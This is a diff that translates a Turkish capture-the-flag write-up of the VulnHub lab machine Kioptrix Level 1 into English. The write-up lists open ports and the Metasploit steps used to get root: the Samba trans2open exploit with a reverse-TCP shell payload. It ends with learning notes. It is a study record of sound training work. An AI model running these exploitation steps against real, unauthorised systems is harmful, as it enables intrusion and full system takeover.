@@ -1,76 +1,77 @@
 # Kioptrix Level 1
 
-## 1. Makine Bilgileri
+## 1. Machine Information
 
 - **Platform:** VulnHub
-- **Zorluk:** Beginner
-- **İşletim Sistemi:** Linux
-- **Tarih:** 26.11.2026
-- **Hedef IP:** 172.20.187.30
-- **Durum:** Root Access Obtained
+- **Difficulty:** Beginner
+- **Operating System:** Linux
+- **Date:** 26.11.2026
+- **Target IP:** 172.20.187.30
+- **Status:** Root Access Obtained
 
-## 2. Amaç
+## 2. Objective
 
-Hedef makinedeki açık portları Nmap ile tespit etmek, çalışan servisleri incelemek ve Samba servisindeki güvenlik açığından yararlanarak sisteme erişim elde etmek.
+The objective was to identify open ports using Nmap, enumerate running services, and gain system access by exploiting a vulnerability in the Samba service.
 
 ## 3. Reconnaissance & Enumeration
 
-Nmap ile gerçekleştirilen tarama sonucunda aşağıdaki portlar tespit edildi:
+The following open ports were identified during the Nmap scan:
 
-| Port | Servis |
-|---|---|
-| 22 | SSH |
-| 80 | HTTP |
-| 111 | RPCbind |
-| 139 | NetBIOS / SMB |
-| 443 | HTTPS |
-| 1024 | Tespit edilmesi gereken servis |
+| Port | Service |
+| ---- | ------- |
+| 22   | SSH |
+| 80   | HTTP |
+| 111  | RPCbind |
+| 139  | NetBIOS / SMB |
+| 443  | HTTPS |
+| 1024 | Service to be identified |
 
-Araştırma sonucunda Samba servisi hedef alındı.
+After investigating the available services, Samba was selected as the primary attack vector.
 
 ## 4. Exploitation
 
-**Kullanılan araç:** Metasploit Framework
+**Tool Used:** Metasploit Framework
 
-**Kullanılan modül:**
+**Exploit Module:**
 `exploit/linux/samba/trans2open`
 
-**İzlenen adımlar:**
+**Steps Performed:**
 
-1. `msfconsole` ile Metasploit başlatıldı.
-2. `search samba` ile Samba ile ilgili modüller arandı.
-3. `use exploit/linux/samba/trans2open` ile ilgili exploit seçildi.
-4. `show options` ile gerekli parametreler incelendi.
-5. `set RHOSTS 172.20.187.30` ile hedef IP tanımlandı.
-6. `set payload generic/shell_reverse_tcp` ile payload değiştirildi.
-7. `run` komutu ile exploit çalıştırıldı.
+1. Started Metasploit using `msfconsole`.
+2. Searched for Samba-related modules using `search samba`.
+3. Selected the exploit using `use exploit/linux/samba/trans2open`.
+4. Inspected the required parameters using `show options`.
+5. Set the target IP address using `set RHOSTS 172.20.187.30`.
+6. Changed the payload using `set payload generic/shell_reverse_tcp`.
+7. Executed the exploit using the `run` command.
 
-**Sonuç:** Başarılı reverse shell bağlantısı elde edildi ve root erişimine ulaşıldı.
+**Result:** Successfully established a reverse shell connection and obtained root access.
 
-## 5. Öğrendiklerim
+## 5. What I Learned
 
-1. Samba servislerinin de güvenlik açıkları içerebileceğini ve servis sürümlerinin araştırılması gerektiğini öğrendim.
-2. Metasploit içerisindeki `search` komutuyla exploit modüllerinin aranabildiğini öğrendim.
-3. Exploit ve payload arasındaki farkı öğrendim.
-4. Reverse shell mantığını ve hedef makinenin saldırgan makineye bağlantı başlatmasını öğrendim.
-5. Generic reverse shell payload yaklaşımını öğrendim.
+1. Samba services can contain security vulnerabilities and their versions should be investigated during enumeration.
+2. Learned how to search for exploit modules using the `search` command in Metasploit.
+3. Understood the difference between an exploit and a payload.
+4. Learned how reverse shells work and how a target machine initiates a connection back to the attacking machine.
+5. Gained an understanding of the generic reverse shell payload approach.
 
-## 6. Zorlandığım Noktalar
+## 6. Challenges Faced
 
-- Exploit modülleri arasından doğru olanı seçmek.
-- Payload seçiminin neden değiştirilmesi gerektiğini anlamak.
-- İşlemci mimarisi ile payload uyumluluğunu anlamak.
+- Selecting the correct exploit module.
+- Understanding why the payload needed to be changed.
+- Understanding the relationship between processor architecture and payload compatibility.
 
-## 7. Bir Sonraki Sefer Dikkat Edeceğim Şeyler
+## 7. Things to Improve
 
-- Açık portları yalnızca listelemek yerine servisleri ve sürümlerini araştırmak.
-- Exploit seçmeden önce hedef servis ile zafiyet uyumluluğunu doğrulamak.
-- Payload seçimini ezberlemek yerine çalışma mantığını anlamak.
-- Her aşamada neden o komutu kullandığımı not etmek.
+- Investigate open ports, services, and their versions instead of simply listing them.
+- Verify compatibility between the target service and the vulnerability before selecting an exploit.
+- Understand payload selection instead of relying on memorized commands.
+- Document the reasoning behind every command and action.
 
-## 8. Sonuç ve Öz Değerlendirme
+## 8. Conclusion & Self-Assessment
 
-Makineyi tamamen bağımsız şekilde çözemedim. İlk denememde video rehberinden yardım aldım. Ancak işlemlerin amaçlarını anlamaya çalışarak çözümü tekrar uyguladım.
+I was unable to solve the machine completely on my own during my first attempt. I initially used a video walkthrough for guidance. However, I focused on understanding the purpose of each step and then reproduced the exploitation process.
 
-**Bir sonraki hedef:** Aynı makineyi herhangi bir video veya walkthrough kullanmadan yeniden çözmek.
-Hedef başarılı.
+**Next Goal:** Reproduce the entire exploitation process without using any video walkthroughs or external guidance.
+
+**Final Result:** Successful.
